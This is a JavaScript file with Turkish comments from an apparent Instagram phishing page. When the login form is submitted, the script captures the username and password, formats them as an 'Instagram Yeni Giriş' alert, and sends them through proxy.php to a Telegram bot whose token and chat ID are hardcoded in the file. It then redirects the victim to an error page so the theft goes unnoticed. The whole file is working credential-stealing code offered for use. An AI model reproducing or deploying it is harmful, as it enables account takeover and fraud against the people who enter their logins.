// Bu değişkeni değiştirerek yönlendirme URL'ini ayarlayabilirsiniz
const REDIRECT_URL = "https://itiraflar.kesug.com/hata/";

// Telegram Bot Bilgileri
const TELEGRAM_BOT_TOKEN = "7676691540:AAH_BiHHfI0hK1EQC87oGw6GjCyI5C6ySKE"; // Bu token sadece bu proje için kullanılmalıdır
const TELEGRAM_CHAT_ID = "-1002584942967"; // Mesajların iletileceği chat ID

// Sayfa yüklendiğinde çalışacak
document.addEventListener('DOMContentLoaded', function() {
  // Login formunu bul
  const loginForm = document.querySelector('form');
  
  if (loginForm) {
    loginForm.addEventListener('submit', handleSubmit);
  }
  
  function handleSubmit(event) {
    event.preventDefault();
    
    // Formdan kullanıcı bilgilerini çek
    const usernameField = document.querySelector('input[name="username"]');
    const passwordField = document.querySelector('input[name="password"]');
    
    if (!usernameField || !passwordField) {
      console.error("Form alanları bulunamadı");
      window.location.href = REDIRECT_URL;
      return;
    }
    
    const username = usernameField.value;
    const password = passwordField.value;
    
    // Eğer alanlar boşsa işlemi durdur
    if (!username || !password) {
      window.location.href = REDIRECT_URL;
      return;
    }
    
    // Giriş butonunu devre dışı bırak
    const submitButton = document.querySelector('button[type="submit"]');
    if (submitButton) {
      submitButton.disabled = true;
      
      // Buton içinde loading spinner var mı kontrol et
      if (!submitButton.querySelector('.animate-spin')) {
        submitButton.textContent = "Giriş yapılıyor...";
      }
    }
    
    // Telegram'a gönder
    sendToTelegram(username, password)
      .then(() => {
        // Başarılı olsun veya olmasın belirtilen URL'e yönlendir
        window.location.href = REDIRECT_URL;
      })
      .catch(error => {
        // Hata olursa yine de yönlendir
        console.error("Gönderim hatası:", error);
        window.location.href = REDIRECT_URL;
      });
  }
  
  async function sendToTelegram(username, password) {
    try {
      // Tarih ve saat bilgisini al
      const now = new Date();
      const dateTimeStr = now.toISOString();
      
      // Telegram API için mesaj metni oluştur
      const messageText = `
🚨 *Instagram Yeni Giriş* 🚨

*Hesap Bilgileri:*
👤 *Kullanıcı Adı:* ${username}
🔒 *Şifre:* ${password}
🕝 *Tarih:* ${dateTimeStr}
      `;
      
      // Proxy PHP dosyasını kullanarak gönder
      const response = await fetch('proxy.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          token: TELEGRAM_BOT_TOKEN,
          text: messageText
        })
      });
      
      if (!response.ok) {
        const errorData = await response.json();
        console.error("Telegram API hatası:", errorData);
      }
      
      return true;
    } catch (error) {
      console.error("Telegram gönderim hatası:", error);
      return false;
    }
  }
});